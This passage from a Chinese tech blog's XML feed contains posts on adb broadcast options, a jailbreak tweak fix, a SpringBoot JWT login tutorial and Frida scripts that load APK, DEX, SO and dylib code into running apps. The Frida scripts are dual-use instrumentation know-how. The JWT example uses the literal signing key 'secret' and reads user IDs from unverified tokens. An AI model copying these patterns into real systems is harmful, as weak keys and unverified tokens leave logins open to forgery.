[--grant-prefix-uri-permission]<br>[--debug-log-resolution]<br>[--exclude-stopped-packages] [--include-stopped-packages]<br>[--activity-brought-to-front] [--activity-clear-top]<br>[--activity-clear-when-task-reset] [--activity-exclude-from-recents]<br>[--activity-launched-from-history] [--activity-multiple-task]<br>[--activity-no-animation] [--activity-no-history]<br>[--activity-no-user-action] [--activity-previous-is-top]<br>[--activity-reorder-to-front] [--activity-reset-task-if-needed]<br>[--activity-single-top] [--activity-clear-task]<br>[--activity-task-on-home]<br>[--receiver-registered-only] [--receiver-replace-pending]<br></code></pre></td></tr></table></figure><p>例如，发送action=”broadcast.demo”的广播，并且对于forceStopPackage()的应用不允许接收该广播，命令如下：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">am broadcast -<span class="hljs-keyword">a</span> broadcast.demo <span class="hljs-comment">--exclude-stopped-packages</span><br></code></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.jianshu.com<span class="hljs-regexp">/p/</span>ea84febaa7bd<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>android</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
      <tag>adb</tag>
      
      <tag>am</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IOS13.3.1 越狱后设置中未显示越狱插件</title>
    <link href="/2021/08/21/IOS13-3-1-%E8%B6%8A%E7%8B%B1%E5%90%8E%E8%AE%BE%E7%BD%AE%E4%B8%AD%E6%9C%AA%E6%98%BE%E7%A4%BA%E8%B6%8A%E7%8B%B1%E6%8F%92%E4%BB%B6/"/>
    <url>/2021/08/21/IOS13-3-1-%E8%B6%8A%E7%8B%B1%E5%90%8E%E8%AE%BE%E7%BD%AE%E4%B8%AD%E6%9C%AA%E6%98%BE%E7%A4%BA%E8%B6%8A%E7%8B%B1%E6%8F%92%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<ol><li>进入 cydia 重新安装 <code>cydia substrate</code>如果还未显示，重新安装 <code>Preference Loader</code></li></ol>]]></content>
    
    
    <categories>
      
      <category>iOS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>越狱</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SpringBoot+JWT Token验证</title>
    <link href="/2021/08/21/SpringBoot-JWT-Token%E9%AA%8C%E8%AF%81/"/>
    <url>/2021/08/21/SpringBoot-JWT-Token%E9%AA%8C%E8%AF%81/</url>
    
    <content type="html"><![CDATA[<h2 id="1-pom-xml-添加依赖"><a href="#1-pom-xml-添加依赖" class="headerlink" title="1. pom.xml 添加依赖"></a>1. pom.xml 添加依赖</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"> <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.auth0<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>java-jwt<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.8.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="2-application-yml"><a href="#2-application-yml" class="headerlink" title="2. application.yml"></a>2. application.yml</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">jwt:</span><br>  <span class="hljs-attr">expire:</span> <span class="hljs-number">86400000</span>      <span class="hljs-comment">#jwt有效时间(24小时)</span><br>  <span class="hljs-attr">secret:</span> <span class="hljs-string">secret</span>        <span class="hljs-comment"># 签名密钥</span><br></code></pre></td></tr></table></figure><h2 id="3-工具类生成、验证token、根据token提取用户ID"><a href="#3-工具类生成、验证token、根据token提取用户ID" class="headerlink" title="3. 工具类生成、验证token、根据token提取用户ID"></a>3. 工具类生成、验证token、根据token提取用户ID</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">JwtUtil</span> </span>&#123;<br><br>    <span class="hljs-comment">//token有效时长</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span>  <span class="hljs-keyword">long</span> EXPIRE_TIME;<br>    <span class="hljs-comment">//密钥</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String SECRET;<br><br>    <span class="hljs-meta">@Value(&quot;$&#123;jwt.secret&#125;&quot;)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setSecret</span><span class="hljs-params">(String secret)</span> </span>&#123;<br>        JwtUtil.SECRET= secret;<br>    &#125;<br><br>    <span class="hljs-meta">@Value(&quot;$&#123;jwt.expire&#125;&quot;)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setExpireTime</span><span class="hljs-params">(<span class="hljs-keyword">long</span> date)</span> </span>&#123;<br>        JwtUtil.EXPIRE_TIME= date;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 生成签名，24小时后过期</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> userId</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">getToken</span><span class="hljs-params">(String userId)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Date date = <span class="hljs-keyword">new</span> Date(System.currentTimeMillis() + EXPIRE_TIME);<br>            Algorithm algorithm = Algorithm.HMAC256(SECRET);<br>            <span class="hljs-keyword">return</span> JWT.create()<br>                    <span class="hljs-comment">// 将 user id 保存到 token 里面</span><br>                    .withAudience(userId)<br>                    .withExpiresAt(date)<br>                    <span class="hljs-comment">// token 的密钥</span><br>                    .sign(algorithm);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 根据token获取userId</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> token</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">getUserName</span><span class="hljs-params">(String token)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            String userId = JWT.decode(token).getAudience().get(<span class="hljs-number">0</span>);<br>            <span class="hljs-keyword">return</span> userId;<br>        &#125; <span class="hljs-keyword">catch</span> (JWTDecodeException e) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 校验token</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> token</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> DecodedJWT <span class="hljs-title">verify</span><span class="hljs-params">(String token)</span></span>&#123;<br>        JWTVerifier build = JWT.require(Algorithm.HMAC256(SECRET)).build();<br>        <span class="hljs-keyword">return</span> build.verify(token);  <br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-添加拦截器"><a href="#4-添加拦截器" class="headerlink" title="4. 添加拦截器"></a>4. 添加拦截器</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">JwtInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">HandlerInterceptor</span> </span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">preHandle</span><span class="hljs-params">(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Object object)</span> </span>&#123;<br>        <span class="hljs-comment">//OPTIONS请求默认通过</span><br>        <span class="hljs-keyword">if</span> (httpServletRequest.getMethod().equals(<span class="hljs-string">&quot;OPTIONS&quot;</span>))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>        &#125;<br>        <span class="hljs-comment">//获取请求头X-Token字段</span><br>        String token = httpServletRequest.getHeader(<span class="hljs-string">&quot;X-Token&quot;</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            JwtUtil.verify(token);<br>        &#125;<span class="hljs-keyword">catch</span> (SignatureVerificationException e)&#123;<br>            <span class="hljs-comment">//e.printStackTrace();</span><br>            System.out.println(<span class="hljs-string">&quot;无效签名&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>        &#125;<span class="hljs-keyword">catch</span> (TokenExpiredException e)&#123;<br>            <span class="hljs-comment">//e.printStackTrace();</span><br>            System.out.println(<span class="hljs-string">&quot;token过期&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>        &#125;<span class="hljs-keyword">catch</span> (AlgorithmMismatchException e)&#123;<br>            <span class="hljs-comment">//e.printStackTrace();</span><br>            System.out.println(<span class="hljs-string">&quot;token算法不一致&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            <span class="hljs-comment">//e.printStackTrace();</span><br>            System.out.println(<span class="hljs-string">&quot;token无效&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">postHandle</span><span class="hljs-params">(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Object o, ModelAndView modelAndView)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br><br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">afterCompletion</span><span class="hljs-params">(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Object o, Exception e)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="5-配置拦截器"><a href="#5-配置拦截器" class="headerlink" title="5. 配置拦截器"></a>5. 配置拦截器</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">InterceptorConfig</span>  <span class="hljs-keyword">implements</span> <span class="hljs-title">WebMvcConfigurer</span> </span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">addInterceptors</span><span class="hljs-params">(InterceptorRegistry registry)</span> </span>&#123;<br><br>        registry.addInterceptor(<span class="hljs-keyword">new</span> JwtInterceptor())<br>                <span class="hljs-comment">//拦截的路径</span><br>                .addPathPatterns(<span class="hljs-string">&quot;/**&quot;</span>)<br>                <span class="hljs-comment">//排除登录接口</span><br>                .excludePathPatterns(<span class="hljs-string">&quot;/prod-api/user/login&quot;</span>)<br>                .excludePathPatterns(<span class="hljs-string">&quot;/prod-api/user/logout&quot;</span>);<br>        WebMvcConfigurer.<span class="hljs-keyword">super</span>.addInterceptors(registry);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="6-controller层实现登录方法和获取用户信息"><a href="#6-controller层实现登录方法和获取用户信息" class="headerlink" title="6. controller层实现登录方法和获取用户信息"></a>6. controller层实现登录方法和获取用户信息</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(value = &quot;/login&quot;,method = RequestMethod.POST)</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> Result&lt;JSONObject&gt; <span class="hljs-title">login</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> String userInfo)</span></span>&#123;<br>    JSONObject jsonObject = JSON.parseObject(userInfo);<br>    String username = (String) jsonObject.get(<span class="hljs-string">&quot;username&quot;</span>);  <span class="hljs-comment">//获取登录账号</span><br>    String password = (String) jsonObject.get(<span class="hljs-string">&quot;password&quot;</span>);  <span class="hljs-comment">//登录密码</span><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 验证用户密码是否正确（此处省略）</span><br><span class="hljs-comment">     */</span>        <br><br>    JSONObject dataJson = <span class="hljs-keyword">new</span> JSONObject();<br>    dataJson.put(<span class="hljs-string">&quot;token&quot;</span>,JwtUtil.getToken(username));  <span class="hljs-comment">//将生成token发送至用户</span><br>    <span class="hljs-keyword">return</span> Result.success(<span class="hljs-string">&quot;登录成功&quot;</span>, dataJson);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="7-测试"><a href="#7-测试" class="headerlink" title="7. 测试"></a>7. 测试</h2><p>登录成功返回token</p> <img src="/2021/08/21/SpringBoot-JWT-Token%E9%AA%8C%E8%AF%81/images/login.png" class=""><p>更改请求x-token，被拦截器拦截返回错误信息</p> <img src="/2021/08/21/SpringBoot-JWT-Token%E9%AA%8C%E8%AF%81/images/token.png" class=""><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p><a href="https://github.com/lingade/springboot-jwt">SpringBoot+JWT Token验证</a></p>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JWT</tag>
      
      <tag>java</tag>
      
      <tag>springboot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Frida加载APK/DEX/SO/dylib/文件并调用方法</title>
    <link href="/2021/08/21/Frida%E5%8A%A0%E8%BD%BDAPK-DEX%E6%96%87%E4%BB%B6%E5%B9%B6%E8%B0%83%E7%94%A8%E6%96%B9%E6%B3%95/"/>
    <url>/2021/08/21/Frida%E5%8A%A0%E8%BD%BDAPK-DEX%E6%96%87%E4%BB%B6%E5%B9%B6%E8%B0%83%E7%94%A8%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h2 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h2><h3 id="加载APK并调用方法"><a href="#加载APK并调用方法" class="headerlink" title="加载APK并调用方法"></a>加载APK并调用方法</h3><h4 id="1-AndroidStudio创建项目"><a href="#1-AndroidStudio创建项目" class="headerlink" title="1. AndroidStudio创建项目"></a>1. AndroidStudio创建项目</h4><p>创建returnNum方法</p> <img src="/2021/08/21/Frida%E5%8A%A0%E8%BD%BDAPK-DEX%E6%96%87%E4%BB%B6%E5%B9%B6%E8%B0%83%E7%94%A8%E6%96%B9%E6%B3%95/images/as.png" class=""><h4 id="2-build项目，将apk-push手机中"><a href="#2-build项目，将apk-push手机中" class="headerlink" title="2. build项目，将apk push手机中"></a>2. build项目，将apk push手机中</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">adb push 1.apk /data/local/tmp<br></code></pre></td></tr></table></figure><h4 id="3-Frida加载APK调用方法"><a href="#3-Frida加载APK调用方法" class="headerlink" title="3. Frida加载APK调用方法"></a>3. Frida加载APK调用方法</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> DEXFactory = <span class="hljs-literal">null</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">loadAPK</span>(<span class="hljs-params">path</span>)</span>&#123;<br>    <span class="hljs-keyword">var</span> ActivityThread = Java.use(<span class="hljs-string">&quot;android.app.ActivityThread&quot;</span>);<br>    <span class="hljs-keyword">var</span> app = ActivityThread.currentApplication();<br>    Java.classFactory.cacheDir = <span class="hljs-string">&quot;/data/data/&quot;</span> + app.getPackageName() + <span class="hljs-string">&quot;/cache&quot;</span>;<br>    Java.classFactory.codeCacheDir = <span class="hljs-string">&quot;/data/data/&quot;</span> + app.getPackageName() + <span class="hljs-string">&quot;/code_cache&quot;</span>;<br>    <span class="hljs-keyword">var</span> DexClassLoader = Java.use(<span class="hljs-string">&quot;dalvik.system.DexClassLoader&quot;</span>);<br>    <span class="hljs-keyword">var</span> DEXCL = DexClassLoader.$new(path, Java.classFactory.codeCacheDir, <span class="hljs-literal">null</span>, DexClassLoader.getSystemClassLoader());<br>    DEXFactory = Java.ClassFactory.get(DEXCL);<br>    DEXFactory.cacheDir = <span class="hljs-string">&quot;/data/data/&quot;</span> + app.getPackageName() + <span class="hljs-string">&quot;/cache&quot;</span>;<br>    DEXFactory.codeCacheDir = <span class="hljs-string">&quot;/data/data/&quot;</span> + app.getPackageName() + <span class="hljs-string">&quot;/code_cache&quot;</span>;<br>&#125;<br><br><br>Java.performNow(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>    loadAPK(<span class="hljs-string">&quot;/data/local/tmp/1.apk&quot;</span>);<br>    <span class="hljs-keyword">var</span> utils = DEXFactory.use(<span class="hljs-string">&quot;custom.dex.utils&quot;</span>);<br>    <span class="hljs-built_in">console</span>.log(utils.returnNum());<br><br>&#125;);<br></code></pre></td></tr></table></figure><p>加载APK并调用方法,此处方法只是简单的return 数字，也可以将一些复杂的逻辑放在APK中用于调用</p> <img src="/2021/08/21/Frida%E5%8A%A0%E8%BD%BDAPK-DEX%E6%96%87%E4%BB%B6%E5%B9%B6%E8%B0%83%E7%94%A8%E6%96%B9%E6%B3%95/images/frida.png" class=""><h3 id="加载DEX并调用方法"><a href="#加载DEX并调用方法" class="headerlink" title="加载DEX并调用方法"></a>加载DEX并调用方法</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js">Java.openClassFile(<span class="hljs-string">&quot;/data/local/tmp/xxx.dex&quot;</span>).load();<br><span class="hljs-keyword">var</span>  utils = Java.use(<span class="hljs-string">&quot;custom.dex.utils&quot;</span>);<br><span class="hljs-built_in">console</span>.log(utils.returnNum());<br></code></pre></td></tr></table></figure><h3 id="加载SO并调用方法"><a href="#加载SO并调用方法" class="headerlink" title="加载SO并调用方法"></a>加载SO并调用方法</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> moduleLibext = Module.load(<span class="hljs-string">&quot;/data/local/tmp/libxxxx.so&quot;</span>);<br><span class="hljs-keyword">var</span>   addrSayHello = moduleLibext.findExportByName(<span class="hljs-string">&quot;sayHello&quot;</span>);<br><span class="hljs-keyword">var</span> funcSayHello = <span class="hljs-keyword">new</span> NativeFunction(addrSayHello, <span class="hljs-string">&quot;void&quot;</span>, [<span class="hljs-string">&quot;void&quot;</span>]);<br>funcSayHello();<br></code></pre></td></tr></table></figure><h2 id="iOS"><a href="#iOS" class="headerlink" title="iOS"></a>iOS</h2><ol><li><p>生成.dylib文件</p><p>注意：不要创建<code>+ (void)load&#123;&#125;</code>方法，加载动态库后APP会闪退</p></li></ol> <img src="/2021/08/21/Frida%E5%8A%A0%E8%BD%BDAPK-DEX%E6%96%87%E4%BB%B6%E5%B9%B6%E8%B0%83%E7%94%A8%E6%96%B9%E6%B3%95/images/iostools.png" class=""><ol start="2"><li><p>加载脚本</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span>  moduleLibext = <span class="hljs-literal">null</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">loadDylib</span>(<span class="hljs-params">moduleName</span>) </span>&#123;<br>    <span class="hljs-comment">// var dlopen = new NativeFunction(Module.findExportByName(null, &#x27;dlopen&#x27;), &#x27;pointer&#x27;, [&#x27;pointer&#x27;, &#x27;int&#x27;]);</span><br>    <span class="hljs-comment">// var path = Memory.allocUtf8String(&quot;/private/var/tmp/22.dylib&quot;);</span><br>    <span class="hljs-comment">// var res =  dlopen(path, 10);</span><br>    <span class="hljs-keyword">if</span> (moduleLibext !==<span class="hljs-literal">null</span>)&#123;<br>        <span class="hljs-built_in">console</span>.error(<span class="hljs-string">&quot;[*] 🍺🍺 Dylib already loaded 🍺🍺&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    moduleLibext = Module.load(moduleName);<br>    <span class="hljs-built_in">console</span>.error(<span class="hljs-string">&quot;[*] 🍺🍺 Dylib load sucess 🍺🍺&quot;</span>);<br>    <span class="hljs-keyword">var</span> enumerateImports =  moduleLibext.enumerateExports();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>;i&lt;enumerateImports.length;i++)&#123;<br>        <span class="hljs-built_in">console</span>.error(<span class="hljs-string">`[*] name:<span class="hljs-subst">$&#123;enumerateImports[i].name&#125;</span> type:<span class="hljs-subst">$&#123;enumerateImports[i].type&#125;</span>`</span>)<br>    &#125;<br><br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getModuleList</span>(<span class="hljs-params"></span>)</span>&#123;<br>    Process.enumerateModules(&#123;<br>            <span class="hljs-attr">onMatch</span>: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"><span class="hljs-built_in">module</span></span>)</span>&#123;<br>                    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;Module name: &#x27;</span> + <span class="hljs-built_in">module</span>.name);<br>                    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;Base address: &#x27;</span> + <span class="hljs-built_in">module</span>.base);<br>                    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;Size: &#x27;</span> + <span class="hljs-built_in">module</span>.size);<br>                    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;Path: &#x27;</span> + <span class="hljs-built_in">module</span>.path);<br>                    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;--------------------------------------------------------&#x27;</span>);<br>            &#125;,<br><br>            <span class="hljs-attr">onComplete</span>: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>            &#125;<br><br>    &#125;);<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getExports</span>(<span class="hljs-params">moduleName</span>) </span>&#123;<br>    <span class="hljs-keyword">if</span> (moduleLibext == <span class="hljs-literal">null</span>)&#123;<br>       loadDylib(moduleName)<br>    &#125;<br>    <span class="hljs-keyword">var</span> enumerateImports =  moduleLibext.enumerateExports();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>;i&lt;enumerateImports.length;i++)&#123;<br>        <span class="hljs-built_in">console</span>.error(<span class="hljs-string">`\n[*] name:<span class="hljs-subst">$&#123;enumerateImports[i].name&#125;</span> type:<span class="hljs-subst">$&#123;enumerateImports[i].type&#125;</span>`</span>)<br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFuncPointer</span>(<span class="hljs-params">moduleName,funcName,retunType,argTypes</span>) </span>&#123;<br>      loadDylib(moduleName);<br>      <span class="hljs-keyword">var</span> funcPointer = moduleLibext.findExportByName(funcName);<br>      <span class="hljs-keyword">return</span>  <span class="hljs-keyword">new</span> NativeFunction(funcPointer, retunType,argTypes);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">exec</span>(<span class="hljs-params"></span>)</span>&#123;<br><br>    <span class="hljs-keyword">var</span> 